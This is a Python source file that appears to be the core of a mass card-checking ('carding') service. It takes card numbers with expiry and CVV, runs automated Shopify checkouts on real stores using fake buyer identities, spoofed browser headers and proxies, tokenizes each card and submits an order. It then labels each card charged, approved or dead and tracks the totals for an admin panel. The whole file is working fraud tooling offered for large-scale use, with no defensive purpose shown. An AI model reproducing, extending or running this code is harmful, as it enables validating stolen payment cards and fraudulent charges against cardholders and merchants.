"""
checker_core.py
────────────────────────────────────────────────────────────────────────────
Pure async Shopify card-checking engine.
Imported by both the FastAPI server AND the Telegram bot — zero duplication.
Designed for 100k concurrent users: uses a global aiohttp connector pool,
a global semaphore to cap in-flight Shopify requests, and a stats counter
that feeds the admin panel in real time.
────────────────────────────────────────────────────────────────────────────
"""

import asyncio
import aiohttp
import json
import re
import random
import time
from urllib.parse import urlparse

# ─── Import GraphQL queries ────────────────────────────────────────────────
from queries import (
    QUERY_PROPOSAL_SHIPPING,
    QUERY_PROPOSAL_DELIVERY,
    MUTATION_SUBMIT,
    QUERY_POLL,
)

# ─── Global connection pool (shared across ALL requests) ──────────────────
# One TCPConnector with 2000 connections total, 200 per host.
# Created lazily on first use so it lives in the running event loop.
_connector: aiohttp.TCPConnector | None = None
_connector_lock = asyncio.Lock()

# ─── Fair concurrency cap ─────────────────────────────────────────────────
# Default 100_000 — every queued user gets a slot immediately.
# Each in-flight checkout holds ONE asyncio coroutine (~4KB stack) + one
# aiohttp keep-alive slot.  On Railway Pro (8 GB / 8 vCPU) this is fine.
# Railway Hobby (512 MB): keep at ~5000 or OOM will kill you.
MAX_CONCURRENT = int(__import__("os").getenv("MAX_CONCURRENT", "100000"))
_semaphore: asyncio.Semaphore | None = None

# ─── Global stats (admin panel reads these) ───────────────────────────────
stats: dict = {
    "total_checked": 0,
    "charged": 0,
    "approved": 0,
    "dead": 0,
    "errors": 0,
    "active_requests": 0,
    "start_time": time.time(),
}


async def _get_connector() -> aiohttp.TCPConnector:
    global _connector
    async with _connector_lock:
        if _connector is None or _connector.closed:
            _connector = aiohttp.TCPConnector(
                ssl=False,
                limit=0,             # 0 = unlimited pool size (OS caps it)
                limit_per_host=0,    # 0 = unlimited per host
                ttl_dns_cache=300,   # DNS cache 5 min
                enable_cleanup_closed=True,
                force_close=False,   # keep-alive reuse
            )
    return _connector


def _get_semaphore() -> asyncio.Semaphore:
    global _semaphore
    if _semaphore is None:
        _semaphore = asyncio.Semaphore(MAX_CONCURRENT)
    return _semaphore


# ─── Address book ─────────────────────────────────────────────────────────
C2C = {"USD": "US", "CAD": "CA", "INR": "IN", "AED": "AE",
       "HKD": "HK", "GBP": "GB", "CHF": "CH"}

ADDRESS_BOOK: dict = {
    "US":  {"address1": "123 Main",            "city": "New York",  "postalCode": "10080", "zoneCode": "NY",  "countryCode": "US", "phone": "2194157586"},
    "CA":  {"address1": "88 Queen",             "city": "Toronto",   "postalCode": "M5J2J3","zoneCode": "ON",  "countryCode": "CA", "phone": "4165550198"},
    "GB":  {"address1": "221B Baker Street",    "city": "London",    "postalCode": "NW1 6XE","zoneCode":"LND", "countryCode": "GB", "phone": "2079460123"},
    "IN":  {"address1": "221B MG",              "city": "Mumbai",    "postalCode": "400001","zoneCode": "MH",  "countryCode": "IN", "phone": "+91 9876543210"},
    "AE":  {"address1": "Burj Tower",           "city": "Dubai",     "postalCode": "",      "zoneCode": "DU",  "countryCode": "AE", "phone": "+971 50 123 4567"},
    "HK":  {"address1": "Nathan 88",            "city": "Kowloon",   "postalCode": "",      "zoneCode": "KL",  "countryCode": "HK", "phone": "+852 5555 5555"},
    "CN":  {"address1": "8 Zhongguancun Street","city": "Beijing",   "postalCode": "100080","zoneCode": "BJ",  "countryCode": "CN", "phone": "1062512345"},
    "CH":  {"address1": "Gotthardstrasse 17",   "city": "Schweiz",   "postalCode": "6430",  "zoneCode": "SZ",  "countryCode": "CH", "phone": "445512345"},
    "AU":  {"address1": "1 Martin Place",       "city": "Sydney",    "postalCode": "2000",  "zoneCode": "NSW", "countryCode": "AU", "phone": "291234567"},
    "DEFAULT": {"address1": "123 Main", "city": "New York", "postalCode": "10080",
                "zoneCode": "NY", "countryCode": "US", "phone": "2194157586"},
}

FIRST_NAMES = ["James","John","Robert","Michael","William","David","Mary","Patricia","Jennifer","Linda"]
LAST_NAMES  = ["Smith","Johnson","Williams","Brown","Jones","Garcia","Miller","Davis","Rodriguez"]
EMAIL_DOMAINS = ["gmail.com","yahoo.com","outlook.com","protonmail.com"]


# ─── Utilities ────────────────────────────────────────────────────────────

def pick_addr(url: str, cc: str = "", rc: str = "") -> dict:
    cc = (cc or "").upper()
    rc = (rc or "").upper()
    tld = urlparse(url).netloc.split(".")[-1].upper()
    if tld in ADDRESS_BOOK:
        return ADDRESS_BOOK[tld]
    ccn = C2C.get(cc)
    if rc in ADDRESS_BOOK and ccn == rc:
        return ADDRESS_BOOK[rc]
    if rc in ADDRESS_BOOK:
        return ADDRESS_BOOK[rc]
    return ADDRESS_BOOK["DEFAULT"]


def _rand_name() -> tuple[str, str]:
    return random.choice(FIRST_NAMES), random.choice(LAST_NAMES)


def _rand_email(first: str, last: str) -> str:
    return f"{first.lower()}.{last.lower()}@{random.choice(EMAIL_DOMAINS)}"


def parse_proxy(proxy_str: str | None) -> str | None:
    if not proxy_str:
        return None
    p = proxy_str.split(":")
    if len(p) == 2:
        return f"http://{p[0]}:{p[1]}"
    if len(p) == 4:
        return f"http://{p[2]}:{p[3]}@{p[0]}:{p[1]}"
    return None


def capture(data: str, first: str, last: str) -> str | None:
    try:
        s = data.index(first) + len(first)
        e = data.index(last, s)
        return data[s:e]
    except ValueError:
        return None


def extract_between(text: str, start: str, end: str) -> str | None:
    if not text or not start or not end:
        return None
    try:
        if start in text:
            part = text.split(start, 1)
            if len(part) > 1 and end in part[1]:
                return part[1].split(end, 1)[0] or None
    except Exception:
        return None
    return None


def is_captcha_required(text: str) -> bool:
    if not text:
        return False
    t = text.upper()
    for kw in ("CAPTCHA_REQUIRED", "CAPTCHA CHALLENGE", "HCAPTCHA", "H-CAPTCHA"):
        if kw in t:
            return True
    return False


def extract_clean_response(message: str) -> str:
    if not message:
        return "UNKNOWN_ERROR"
    msg = str(message)
    for pat in [
        r"(PAYMENTS_[A-Z_]+)", r"(CARD_[A-Z_]+)", r"([A-Z]+_[A-Z]+_[A-Z_]+)",
        r"([A-Z]+_[A-Z_]+)", r"code[\"']?\s*[:=]\s*[\"']?([^\"',]+)[\"']?",
        r'\{"code":"([^"]+)"', r"'code':'([^']+)'",
    ]:
        for m in re.findall(pat, msg, re.IGNORECASE):
            if isinstance(m, tuple):
                m = m[0]
            if m and "_" in m and len(m) < 50:
                return m.strip("{}:'\" ")
    return msg[:50]


def parse_cc_string(cc_string: str) -> dict:
    parts = cc_string.split("|")
    if len(parts) != 4:
        raise ValueError("Invalid CC format. Use CC|MM|YYYY|CVV")
    return {"cc": parts[0].strip(), "mes": parts[1].strip(),
            "ano": parts[2].strip(), "cvv": parts[3].strip()}


# ─── BIN info ─────────────────────────────────────────────────────────────

async def get_bin_info(card_number: str) -> tuple:
    try:
        bn = card_number[:6]
        timeout = aiohttp.ClientTimeout(total=10)
        conn = await _get_connector()
        async with aiohttp.ClientSession(connector=conn, connector_owner=False, timeout=timeout) as s:
            async with s.get(f"https://bins.antipublic.cc/bins/{bn}") as r:
                if r.status != 200:
                    return "-", "-", "-", "-", "-", ""
                data = await r.json(content_type=None)
                return (data.get("brand","-"), data.get("type","-"),
                        data.get("level","-"), data.get("bank","-"),
                        data.get("country_name","-"), data.get("country_flag",""))
    except Exception:
        return "-", "-", "-", "-", "-", ""


# ─── GraphQL helper ───────────────────────────────────────────────────────

async def _gql(session: aiohttp.ClientSession, url: str, params: dict,
               headers: dict, body: dict, proxy: str | None) -> tuple[str | None, str]:
    """Single GraphQL POST. Returns (raw_text | None, error_str)."""
    try:
        async with session.post(url, params=params, headers=headers,
                                json=body, proxy=proxy) as r:
            return await r.text(), ""
    except asyncio.TimeoutError:
        return None, "timeout"
    except Exception as e:
        return None, str(e)


# ─── Product fetcher ──────────────────────────────────────────────────────

async def fetch_products(domain: str, proxy_str: str | None = None) -> dict | tuple:
    if not domain.startswith("http"):
        domain = "https://" + domain
    proxy = parse_proxy(proxy_str)
    timeout = aiohttp.ClientTimeout(total=15)
    conn = await _get_connector()
    try:
        async with aiohttp.ClientSession(connector=conn, connector_owner=False, timeout=timeout) as s:
            async with s.get(f"{domain}/products.json", proxy=proxy) as r:
                if r.status != 200:
                    return False, f"<b>Site Error! Status: {r.status}</b>"
                text = await r.text()
                if "shopify" not in text.lower():
                    return False, "<b>Not Shopify!</b>"
                data = json.loads(text).get("products", [])
                if not data:
                    return False, "<b>No Products!</b>"

        best_price = float("inf")
        best = None
        for product in data:
            for variant in product.get("variants", []):
                if not variant.get("available", True):
                    continue
                try:
                    price = float(str(variant.get("price", "0")).replace(",", ""))
                    if price < best_price:
                        best_price = price
                        best = {
                            "site": domain,
                            "price": f"{price:.2f}",
                            "variant_id": str(variant["id"]),
                            "link": f"{domain}/products/{product['handle']}",
                        }
                except (ValueError, TypeError):
                    continue

        if best and best.get("variant_id"):
            return best
        return False, "<b>No Valid Products</b>"
    except aiohttp.ClientError as e:
        return False, f"<b>Proxy Error: {e}</b>"
    except Exception as e:
        return False, f"error: {e}"


# ─── MAIN card processor ──────────────────────────────────────────────────

async def process_card(
    cc: str, mes: str, ano: str, cvv: str,
    site_url: str, variant_id: str | None = None,
    proxy_str: str | None = None,
) -> tuple[bool, str, str, str, str]:
    """
    Returns (success, message, gateway, price, currency).
    Wrapped by semaphore to cap concurrency globally.
    """
    async with _get_semaphore():
        stats["active_requests"] += 1
        try:
            result = await _process_card_inner(cc, mes, ano, cvv, site_url, variant_id, proxy_str)
        finally:
            stats["active_requests"] -= 1
            stats["total_checked"] += 1
        return result


async def _process_card_inner(
    cc: str, mes: str, ano: str, cvv: str,
    site_url: str, variant_id: str | None = None,
    proxy_str: str | None = None,
) -> tuple[bool, str, str, str, str]:
    gateway = "UNKNOWN"
    total_price = "0.00"
    currency = "USD"
    ourl = site_url if site_url.startswith("http") else f"https://{site_url}"
    proxy = parse_proxy(proxy_str)
    checkpoint_data = None
    running_total = "0.00"

    try:
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0",
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "en-US,en;q=0.9",
            "Content-Type": "application/json",
            "Origin": ourl,
            "Referer": ourl,
            "sec-ch-ua": '"Chromium";v="146", "Not-A.Brand";v="24", "Microsoft Edge";v="146"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
        }

        addr = pick_addr(ourl)
        country_code = addr["countryCode"]
        first, last = _rand_name()
        email = _rand_email(first, last)
        phone = addr["phone"]
        street = addr["address1"]
        city = addr["city"]
        state = addr["zoneCode"]
        s_zip = addr["postalCode"]
        address2 = ""

        if not variant_id:
            info = await fetch_products(ourl, proxy_str)
            if isinstance(info, tuple) and info[0] is False:
                return False, info[1], gateway, total_price, currency
            variant_id = info["variant_id"]

        # ── Shared session for this entire checkout flow ──
        timeout = aiohttp.ClientTimeout(total=60)
        conn = await _get_connector()
        async with aiohttp.ClientSession(connector=conn, connector_owner=False,
                                         timeout=timeout) as session:

            # 1. Add to cart
            cart_url = ourl + "/cart/add.js"
            cart_hdrs = {**headers, "Content-Type": "application/x-www-form-urlencoded",
                         "Accept": "application/json, text/javascript"}
            async with session.post(cart_url, data=f"id={variant_id}&quantity=1",
                                    headers=cart_hdrs, proxy=proxy) as cr:
                if cr.status != 200:
                    alt_hdrs = {**headers, "Content-Type": "application/json"}
                    async with session.post(cart_url,
                                            json={"items": [{"id": int(variant_id), "quantity": 1}]},
                                            headers=alt_hdrs, proxy=proxy) as cr2:
                        if cr2.status != 200:
                            return False, f"Cart failed {cr2.status}", gateway, total_price, currency

            # 2. Checkout redirect
            checkout_hdrs = {**headers,
                             "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                             "sec-fetch-dest": "document", "sec-fetch-mode": "navigate",
                             "sec-fetch-site": "same-origin", "sec-fetch-user": "?1"}
            async with session.post(ourl + "/checkout/", allow_redirects=True,
                                    headers=checkout_hdrs, proxy=proxy) as resp:
                checkout_url = str(resp.url)
                text = await resp.text()

            # Extract tokens
            attempt_m = re.search(r"/checkouts/cn/([^/?]+)", checkout_url)
            attempt_token = (attempt_m.group(1) if attempt_m
                             else checkout_url.split("/")[-1].split("?")[0])

            sst = (resp.headers.get("X-Checkout-One-Session-Token") or
                   resp.headers.get("x-checkout-one-session-token"))
            if not sst:
                for pat_s, pat_e in [
                    ('name="serialized-sessionToken" content="&quot;', '&quot;'),
                    ('name="serialized-sessionToken" content="', '"'),
                    ('"serializedSessionToken":"', '"'),
                    ('data-session-token="', '"'),
                    ('"sessionToken":"', '"'),
                ]:
                    sst = extract_between(text, pat_s, pat_e)
                    if sst:
                        break

            if "login" in checkout_url.lower():
                return False, "Site requires login!", gateway, total_price, currency
            if not sst:
                return False, "Failed to get session token", gateway, total_price, currency

            queue_token = (extract_between(text, "queueToken&quot;:&quot;", "&quot;") or
                           extract_between(text, '"queueToken":"', '"'))
            stable_id = (extract_between(text, "stableId&quot;:&quot;", "&quot;") or
                         extract_between(text, '"stableId":"', '"'))
            merch = (extract_between(text, "ProductVariantMerchandise/", "&quot;") or
                     extract_between(text, "ProductVariantMerchandise/", "&q") or
                     extract_between(text, '"merchandiseId":"gid://shopify/ProductVariantMerchandise/', '"') or
                     str(variant_id))

            currency = "USD"
            for cs, ce in [('currencyCode&quot;:&quot;', '&quot;'), ('"currencyCode":"', '"')]:
                c = extract_between(text, cs, ce)
                if c:
                    currency = c
                    break

            subtotal = (extract_between(text, 'subtotalBeforeTaxesAndShipping&quot;:{&quot;value&quot;:{&quot;amount&quot;:&quot;', '&quot;') or
                        extract_between(text, '"subtotalBeforeTaxesAndShipping":{"value":{"amount":"', '"'))
            if not subtotal:
                pm = re.search(r'"price":\s*"([\d.]+)"', text)
                subtotal = pm.group(1) if pm else "0.01"

            unesc = text.replace("&quot;", '"').replace("&amp;", "&").replace("&#39;", "'")
            build_id = None
            bm = re.search(r'"commitSha"\s*:\s*"([a-f0-9]{40})"', unesc)
            if bm:
                build_id = bm.group(1)
            source_token = extract_between(text, 'name="serialized-sourceToken" content="', '"')
            if source_token:
                source_token = source_token.replace("&quot;", "").strip('"')
            ident_sig = None
            im = re.search(r'checkoutCardsinkCallerIdentificationSignature":"([^"]+)"', unesc)
            if im:
                ident_sig = im.group(1)

            headers.update({
                "shopify-checkout-client": "checkout-web/1.0",
                "shopify-checkout-source": f'id="{attempt_token}", type="cn"',
                "x-checkout-one-session-token": sst,
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
            })
            if build_id:
                headers["x-checkout-web-build-id"] = build_id
                headers["x-checkout-web-deploy-stage"] = "production"
                headers["x-checkout-web-server-handling"] = "fast"
                headers["x-checkout-web-server-rendering"] = "yes"
            if source_token:
                headers["x-checkout-web-source-id"] = source_token

            gql_url = f"https://{urlparse(ourl).netloc}/checkouts/unstable/graphql"
            params_gql = {"operationName": "Proposal"}

            ship_body = {
                "query": QUERY_PROPOSAL_SHIPPING,
                "operationName": "Proposal",
                "variables": {
                    "sessionInput": {"sessionToken": sst},
                    "queueToken": queue_token or "",
                    "discounts": {"lines": [], "acceptUnexpectedDiscounts": True},
                    "delivery": {
                        "deliveryLines": [{
                            "destination": {"partialStreetAddress": {
                                "address1": street, "address2": address2, "city": city,
                                "countryCode": country_code, "postalCode": s_zip,
                                "firstName": first, "lastName": last,
                                "zoneCode": state, "phone": phone,
                            }},
                            "selectedDeliveryStrategy": {
                                "deliveryStrategyMatchingConditions": {
                                    "estimatedTimeInTransit": {"any": True},
                                    "shipments": {"any": True},
                                },
                                "options": {},
                            },
                            "targetMerchandiseLines": {"any": True},
                            "deliveryMethodTypes": ["SHIPPING"],
                            "expectedTotalPrice": {"any": True},
                            "destinationChanged": True,
                        }],
                        "noDeliveryRequired": [],
                        "useProgressiveRates": False,
                        "prefetchShippingRatesStrategy": None,
                        "supportsSplitShipping": True,
                    },
                    "merchandise": {
                        "merchandiseLines": [{
                            "stableId": stable_id or "1",
                            "merchandise": {
                                "productVariantReference": {
                                    "id": f"gid://shopify/ProductVariantMerchandise/{merch}",
                                    "variantId": f"gid://shopify/ProductVariant/{variant_id}",
                                    "properties": [], "sellingPlanId": None, "sellingPlanDigest": None,
                                }
                            },
                            "quantity": {"items": {"value": 1}},
                            "expectedTotalPrice": {"value": {"amount": subtotal, "currencyCode": currency}},
                            "lineComponentsSource": None, "lineComponents": [],
                        }]
                    },
                    "payment": {
                        "totalAmount": {"any": True},
                        "paymentLines": [],
                        "billingAddress": {"streetAddress": {
                            "address1": "", "city": "", "countryCode": country_code,
                            "lastName": "", "zoneCode": "ENG", "phone": "",
                        }},
                    },
                    "buyerIdentity": {
                        "customer": {"presentmentCurrency": currency, "countryCode": country_code},
                        "email": email, "emailChanged": False,
                        "phoneCountryCode": country_code,
                        "marketingConsent": [{"email": {"value": email}}],
                        "shopPayOptInPhone": {"countryCode": country_code},
                        "rememberMe": False,
                    },
                    "tip": {"tipLines": []},
                    "taxes": {
                        "proposedAllocations": None,
                        "proposedTotalAmount": {"value": {"amount": "0", "currencyCode": currency}},
                        "proposedTotalIncludedAmount": None,
                        "proposedMixedStateTotalAmount": None,
                        "proposedExemptions": [],
                    },
                    "note": {"message": None, "customAttributes": []},
                    "localizationExtension": {"fields": []},
                    "nonNegotiableTerms": None,
                    "scriptFingerprint": {
                        "signature": None, "signatureUuid": None,
                        "lineItemScriptChanges": [], "paymentScriptChanges": [], "shippingScriptChanges": [],
                    },
                    "optionalDuties": {"buyerRefusesDuties": False},
                },
            }

            # Two proposal calls (matches original timing)
            for _ in range(2):
                resp_text, err = await _gql(session, gql_url, params_gql, headers, ship_body, proxy)
                await asyncio.sleep(3)

            if resp_text is None:
                return False, f"Proposal failed: {err}", gateway, total_price, currency
            if is_captcha_required(resp_text):
                return False, "CAPTCHA_REQUIRED", gateway, total_price, currency

            try:
                rj = json.loads(resp_text)
            except json.JSONDecodeError as e:
                return False, f"Invalid JSON: {e}", gateway, total_price, currency

            if "errors" in rj:
                msgs = [x.get("message", str(x)) for x in rj["errors"][:3]]
                return False, f"GraphQL Error: {'; '.join(msgs)}", gateway, total_price, currency

            try:
                neg = rj["data"]["session"]["negotiate"]
                result = neg["result"]
                rtype = result.get("__typename", "")
                if rtype == "CheckpointDenied":
                    return False, "Checkpoint Denied", gateway, total_price, currency
                if rtype == "Throttled":
                    return False, "Throttled", gateway, total_price, currency
                if rtype == "NegotiationResultFailed":
                    return False, "Negotiation failed", gateway, total_price, currency

                checkpoint_data = result.get("checkpointData")
                seller = result["sellerProposal"]
                delivery_data = seller.get("delivery")
                running_total = seller["runningTotal"]["value"]["amount"]
            except (KeyError, TypeError) as e:
                return False, f"Parse proposal: {e}", gateway, total_price, currency

            if not delivery_data:
                return False, "No delivery data", gateway, total_price, currency

            dtype = delivery_data.get("__typename", "")
            delivery_strategy = ""
            shipping_amount = 0.0
            if dtype == "FilledDeliveryTerms":
                lines = delivery_data.get("deliveryLines", [{}])
                if lines:
                    strategies = lines[0].get("availableDeliveryStrategies", [])
                    if strategies:
                        delivery_strategy = strategies[0].get("handle", "")
                        try:
                            shipping_amount = float(strategies[0].get("amount", {}).get("value", {}).get("amount", "0"))
                        except:
                            pass

            tax_amount = 0.0
            try:
                td = seller.get("tax", {})
                if td and td.get("__typename") == "FilledTaxTerms":
                    tax_amount = float(td.get("totalTaxAmount", {}).get("value", {}).get("amount", "0"))
            except:
                pass

            payment_identifier = None
            payment_data = seller.get("payment", {})
            if payment_data and payment_data.get("__typename") == "FilledPaymentTerms":
                for method in payment_data.get("availablePaymentLines", []):
                    pm = method.get("paymentMethod", {})
                    if pm.get("name") or pm.get("paymentMethodIdentifier"):
                        payment_identifier = pm.get("paymentMethodIdentifier")
                        gateway = pm.get("extensibilityDisplayName") or pm.get("name", "UNKNOWN")
                        total_price = str(float(running_total) + shipping_amount + tax_amount)
                        break

            if not payment_identifier:
                return False, "No valid payment method found", gateway, total_price, currency

            # ── Delivery proposal ──
            del_body = dict(ship_body)
            del_body["query"] = QUERY_PROPOSAL_DELIVERY
            del_body["variables"] = dict(ship_body["variables"])
            dl = del_body["variables"]["delivery"]["deliveryLines"][0]
            dl["selectedDeliveryStrategy"] = {
                "deliveryStrategyByHandle": {"handle": delivery_strategy, "customDeliveryRate": False},
                "options": {},
            }
            dl["targetMerchandiseLines"] = {"lines": [{"stableId": stable_id or "1"}]}
            dl["expectedTotalPrice"] = {"value": {"amount": str(shipping_amount), "currencyCode": currency}}
            dl["destinationChanged"] = False
            del_body["variables"]["payment"]["billingAddress"] = {"streetAddress": {
                "address1": street, "address2": address2, "city": city,
                "countryCode": country_code, "postalCode": s_zip,
                "firstName": first, "lastName": last, "zoneCode": state, "phone": phone,
            }}
            del_body["variables"]["taxes"]["proposedTotalAmount"]["value"]["amount"] = str(tax_amount)
            del_body["variables"]["buyerIdentity"]["shopPayOptInPhone"]["number"] = phone

            resp_text, _ = await _gql(session, gql_url, params_gql, headers, del_body, proxy)
            if is_captcha_required(resp_text or ""):
                return False, "CAPTCHA_REQUIRED on delivery", gateway, total_price, currency

            # ── Tokenize card ──
            vault_hdrs = {
                "Content-Type": "application/json", "Accept": "application/json",
                "Accept-Language": "en-US,en;q=0.9",
                "Origin": "https://checkout.pci.shopifyinc.com",
                "Referer": "https://checkout.pci.shopifyinc.com/build/a8e4a94/number-ltr.html",
                "User-Agent": headers["User-Agent"],
                "sec-ch-ua": headers["sec-ch-ua"],
                "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": '"Windows"',
                "sec-fetch-dest": "empty", "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin", "sec-fetch-storage-access": "active",
            }
            if ident_sig:
                vault_hdrs["shopify-identification-signature"] = ident_sig

            vault_payload = {
                "credit_card": {
                    "number": cc, "month": int(mes), "year": int(ano),
                    "verification_value": cvv, "start_month": None, "start_year": None,
                    "issue_number": "", "name": f"{first} {last}",
                },
                "payment_session_scope": urlparse(ourl).netloc,
            }
            async with session.post("https://checkout.pci.shopifyinc.com/sessions",
                                    json=vault_payload, headers=vault_hdrs, proxy=proxy) as vr:
                try:
                    td = await vr.json(content_type=None)
                    token = td.get("id")
                    if not token:
                        return False, "Unable to get payment token", gateway, total_price, currency
                except Exception as e:
                    return False, f"Token error: {e}", gateway, total_price, currency

            # ── Submit ──
            sub_vars = {
                "input": {
                    "sessionInput": {"sessionToken": sst},
                    "queueToken": queue_token or "",
                    "discounts": {"lines": [], "acceptUnexpectedDiscounts": True},
                    "delivery": {
                        "deliveryLines": [{
                            "destination": {"streetAddress": {
                                "address1": street, "address2": address2, "city": city,
                                "countryCode": country_code, "postalCode": s_zip,
                                "firstName": first, "lastName": last, "zoneCode": state, "phone": phone,
                            }},
                            "selectedDeliveryStrategy": {
                                "deliveryStrategyByHandle": {"handle": delivery_strategy, "customDeliveryRate": False},
                                "options": {"phone": phone},
                            },
                            "targetMerchandiseLines": {"lines": [{"stableId": stable_id or "1"}]},
                            "deliveryMethodTypes": ["SHIPPING"],
                            "expectedTotalPrice": {"value": {"amount": str(shipping_amount), "currencyCode": currency}},
                            "destinationChanged": False,
                        }],
                        "noDeliveryRequired": [], "useProgressiveRates": True,
                        "prefetchShippingRatesStrategy": None, "supportsSplitShipping": True,
                    },
                    "merchandise": {
                        "merchandiseLines": [{
                            "stableId": stable_id or "1",
                            "merchandise": {"productVariantReference": {
                                "id": f"gid://shopify/ProductVariantMerchandise/{merch}",
                                "variantId": f"gid://shopify/ProductVariant/{variant_id}",
                                "properties": [], "sellingPlanId": None, "sellingPlanDigest": None,
                            }},
                            "quantity": {"items": {"value": 1}},
                            "expectedTotalPrice": {"value": {"amount": subtotal, "currencyCode": currency}},
                            "lineComponentsSource": None, "lineComponents": [],
                        }]
                    },
                    "payment": {
                        "totalAmount": {"any": True},
                        "paymentLines": [{
                            "paymentMethod": {"directPaymentMethod": {
                                "paymentMethodIdentifier": payment_identifier,
                                "sessionId": token,
                                "billingAddress": {"streetAddress": {
                                    "address1": street, "address2": address2, "city": city,
                                    "countryCode": country_code, "postalCode": s_zip,
                                    "firstName": first, "lastName": last, "zoneCode": state, "phone": phone,
                                }},
                                "cardSource": None,
                            }},
                            "amount": {"value": {"amount": running_total, "currencyCode": currency}},
                            "dueAt": None,
                        }],
                        "billingAddress": {"streetAddress": {
                            "address1": street, "address2": address2, "city": city,
                            "countryCode": country_code, "postalCode": s_zip,
                            "firstName": first, "lastName": last, "zoneCode": state, "phone": phone,
                        }},
                    },
                    "buyerIdentity": {
                        "customer": {"presentmentCurrency": currency, "countryCode": country_code},
                        "email": email, "emailChanged": False,
                        "phoneCountryCode": country_code,
                        "marketingConsent": [{"email": {"value": email}}],
                        "shopPayOptInPhone": {"number": phone, "countryCode": country_code},
                        "rememberMe": False,
                    },
                    "taxes": {
                        "proposedAllocations": None,
                        "proposedTotalAmount": {"value": {"amount": str(tax_amount), "currencyCode": currency}},
                        "proposedTotalIncludedAmount": None, "proposedMixedStateTotalAmount": None,
                        "proposedExemptions": [],
                    },
                    "tip": {"tipLines": []},
                    "note": {"message": None, "customAttributes": []},
                    "localizationExtension": {"fields": []},
                    "nonNegotiableTerms": None,
                    "optionalDuties": {"buyerRefusesDuties": False},
                },
                "attemptToken": attempt_token,
                "metafields": [],
                "analytics": {"requestUrl": checkout_url},
            }
            if checkpoint_data:
                sub_vars["input"]["checkpointData"] = checkpoint_data

            sub_body = {"query": MUTATION_SUBMIT, "variables": sub_vars, "operationName": "SubmitForCompletion"}
            sub_text, _ = await _gql(session, gql_url, {"operationName": "SubmitForCompletion"}, headers, sub_body, proxy)

            if is_captcha_required(sub_text or ""):
                return False, "CAPTCHA_REQUIRED on submit", gateway, total_price, currency
            if not sub_text:
                return False, "Submit request failed", gateway, total_price, currency

            for bad in ("Your order total has changed.", "The requested payment method is not available."):
                if bad in sub_text:
                    return False, bad, gateway, total_price, currency

            try:
                sj = json.loads(sub_text)
                sd = sj.get("data", {}).get("submitForCompletion", {})
                if not sd:
                    errs = sj.get("errors", [])
                    if errs:
                        code = errs[0].get("code", "")
                        if code:
                            return False, code, gateway, total_price, currency
                    return False, "Empty submit response", gateway, total_price, currency

                stype = sd.get("__typename", "")
                if stype in ("SubmitSuccess", "SubmittedForCompletion", "SubmitAlreadyAccepted"):
                    receipt = sd.get("receipt", {})
                    if not receipt:
                        return False, "SubmitSuccess but no receipt", gateway, total_price, currency
                    if receipt.get("__typename") == "ProcessedReceipt":
                        stats["charged"] += 1
                        return True, "ORDER_PLACED", gateway, total_price, currency
                    rid = receipt.get("id")
                elif stype == "SubmitFailed":
                    reason = sd.get("reason", "Unknown reason")
                    stats["dead"] += 1
                    return False, extract_clean_response(reason), gateway, total_price, currency
                elif stype == "SubmitRejected":
                    for err in sd.get("errors", []):
                        code = err.get("code", "")
                        msg = err.get("localizedMessage", "") or err.get("nonLocalizedMessage", "")
                        if code in ("GENERIC_ERROR", "PAYMENT_FAILED", "") and msg:
                            stats["dead"] += 1
                            return False, msg, gateway, total_price, currency
                        if code:
                            stats["dead"] += 1
                            return False, code, gateway, total_price, currency
                    stats["dead"] += 1
                    return False, "Submit Rejected", gateway, total_price, currency
                elif stype == "Throttled":
                    stats["errors"] += 1
                    return False, "Throttled", gateway, total_price, currency
                else:
                    receipt = sd.get("receipt", {})
                    if not receipt:
                        stats["errors"] += 1
                        return False, "No receipt", gateway, total_price, currency
                    rid = receipt.get("id")
                    if not rid:
                        stats["errors"] += 1
                        return False, "No receipt ID", gateway, total_price, currency
            except json.JSONDecodeError:
                return False, f"Invalid submit JSON: {sub_text[:80]}", gateway, total_price, currency

            # ── Poll for receipt ──
            await asyncio.sleep(3)
            poll_body = {
                "query": QUERY_POLL,
                "variables": {"receiptId": rid, "sessionToken": sst},
                "operationName": "PollForReceipt",
            }
            final_text = ""
            for _ in range(4):
                pt, _ = await _gql(session, gql_url, {"operationName": "PollForReceipt"}, headers, poll_body, proxy)
                if not pt:
                    break
                final_text = pt
                if is_captcha_required(pt):
                    stats["dead"] += 1
                    return True, "CARD_DECLINED", gateway, total_price, currency
                try:
                    pj = json.loads(pt)
                    rd = pj.get("data", {}).get("receipt", {})
                    if rd:
                        rt = rd.get("__typename", "")
                        if rt == "ProcessedReceipt":
                            stats["charged"] += 1
                            return True, "ORDER_PLACED", gateway, total_price, currency
                        elif rt == "FailedReceipt":
                            err = rd.get("processingError", {})
                            etype = err.get("__typename", "")
                            if etype == "PaymentFailed":
                                code = err.get("code", "")
                                msg = err.get("messageUntranslated", "")
                                if code in ("GENERIC_ERROR", "PAYMENT_FAILED", "") and msg:
                                    stats["approved"] += 1
                                    return True, msg, gateway, total_price, currency
                                stats["approved"] += 1
                                return True, code or "PAYMENT_FAILED", gateway, total_price, currency
                            code2 = err.get("code") or etype or "UNKNOWN_ERROR"
                            stats["dead"] += 1
                            return True, code2, gateway, total_price, currency
                        elif rt == "ActionRequiredReceipt":
                            stats["approved"] += 1
                            return True, "OTP_REQUIRED", gateway, total_price, currency
                        if rt in ("ProcessingReceipt", "WaitingReceipt"):
                            await asyncio.sleep(4)
                            continue
                except Exception:
                    pass
                if "WaitingReceipt" in pt:
                    await asyncio.sleep(4)
                else:
                    break

            # Final fallback parse
            if final_text:
                fl = final_text.lower()
                if "actionreq" in fl or "action_required" in fl:
                    stats["approved"] += 1
                    return True, "OTP_REQUIRED", gateway, total_price, currency
                if "processedreceipt" in fl:
                    stats["charged"] += 1
                    return True, "ORDER_PLACED", gateway, total_price, currency
                if "failedreceipt" in fl or "declined" in fl:
                    code = extract_between(final_text, '{"code":"', '"') or "CARD_DECLINED"
                    stats["dead"] += 1
                    return True, code, gateway, total_price, currency
